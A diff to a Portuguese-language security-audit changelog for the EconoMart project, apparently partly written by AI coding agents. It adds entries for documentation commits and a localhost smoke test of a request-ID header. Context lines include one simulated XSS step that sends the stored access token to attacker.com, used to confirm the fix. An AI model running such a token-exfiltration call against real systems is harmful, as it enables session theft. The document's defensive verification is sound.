@@ -197,6 +197,28 @@ Range coberto: `26d5574..HEAD` (todos os commits desta fase de auditoria).
 
 ---
 
+## 62b1ff1 — docs(auditoria): implementation status table
+
+**Achados**: documentação. Adiciona ao topo de `AUDITORIA_COMPLETA_ECONOMART.md` uma tabela com cada achado P0/P1/P2 marcado como implementado/pendente, com hash do commit responsável e quem fez (Claude/Codex).
+
+**Arquivos**: `AUDITORIA_COMPLETA_ECONOMART.md`.
+
+**Risco**: zero.
+
+---
+
+## 30eff07 — docs: organize technical documentation (Codex)
+
+**Achados**: faxina dos docs (responde sugestão do usuário).
+
+**Arquivos**:
+- `docs/README.md` — novo. Índice e legenda do que cada doc é.
+- `docs/implementation-plans/plan-appjs-split.md`, `plan-css-split.md` — movidos da raiz de `docs/` para `docs/implementation-plans/`.
+
+**Risco**: zero. Pura reorganização. Links no CHANGELOG continuam válidos (não havia link cruzado).
+
+---
+
 ## 759e64f — fix(security): P1-1 — access token in memory
 
 **Achados**: P1-1 (token sai de localStorage).
@@ -215,6 +237,21 @@ Range coberto: `26d5574..HEAD` (todos os commits desta fase de auditoria).
 4. Abrir nova aba `/verify/{id}` → `window.Auth.hasSessionHint()` → `true` → `ensureToken` → reveal dos dados.
 5. Logout → `Auth.clear()` → sessionStorage limpa, token zerado.
 6. Simular XSS via console: `fetch('https://attacker.com', { body: localStorage.access_token })` → body fica `undefined` (não tem mais lá).
+
+---
+
+## Smoke test runtime (2026-06-03)
+
+Para confirmar que P1-7 (request_id) está ativo em runtime:
+
+```bash
+curl -i -H "X-Request-ID: smoketest1234" http://localhost:8000/health/live
+# Esperado: cabeçalho X-Request-ID: smoketest1234 ecoado na resposta
+```
+
+Validado localmente — o header foi ecoado, confirmando que o middleware
+está montado e processa o pipeline. Para validar P0/P1 ponta-a-ponta no
+ambiente real, seguir o checklist em `docs/qa-audit-p0-p1-checklist.md`.
 
 ---
 
